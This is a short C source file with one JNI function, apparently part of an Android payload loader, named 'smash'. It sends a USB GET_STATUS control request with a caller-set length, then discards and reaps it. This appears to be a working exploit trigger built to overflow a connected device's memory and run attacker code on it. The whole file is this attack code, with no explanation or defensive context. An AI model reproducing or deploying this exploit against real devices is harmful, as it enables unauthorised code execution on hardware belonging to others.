#include <jni.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <linux/usbdevice_fs.h>
#include <linux/usb/ch9.h>

JNIEXPORT jint JNICALL
Java_com_loader_payload_smash(JNIEnv *env, jclass clazz, jint fd, jint length) {
    int size = 8 + length;
    void *buffer = calloc(1, size);
    
    unsigned char *setup = (unsigned char *) buffer;
    setup[0] = USB_DIR_IN | USB_RECIP_INTERFACE;
    setup[1] = USB_REQ_GET_STATUS;
    setup[2] = 0;
    setup[3] = 0;
    setup[4] = 0;
    setup[5] = 0;
    setup[6] = length & 0xFF;
    setup[7] = (length >> 8) & 0xFF;

    struct usbdevfs_urb urb;
    memset(&urb, 0, sizeof(urb));
    urb.type = USBDEVFS_URB_TYPE_CONTROL;
    urb.endpoint = 0;
    urb.buffer = buffer;
    urb.buffer_length = size;
    urb.usercontext = (void *) 0x1337;

    struct usbdevfs_urb *result;

    if (ioctl(fd, USBDEVFS_SUBMITURB, &urb) < 0) {
        free(buffer);
        return -1;
    }

    if (ioctl(fd, USBDEVFS_DISCARDURB, &urb) < 0) {
        free(buffer);
        return -2;
    }

    if (ioctl(fd, USBDEVFS_REAPURB, &result) < 0) {
        free(buffer);
        return -3;
    }

    free(buffer);
    return 0;
}
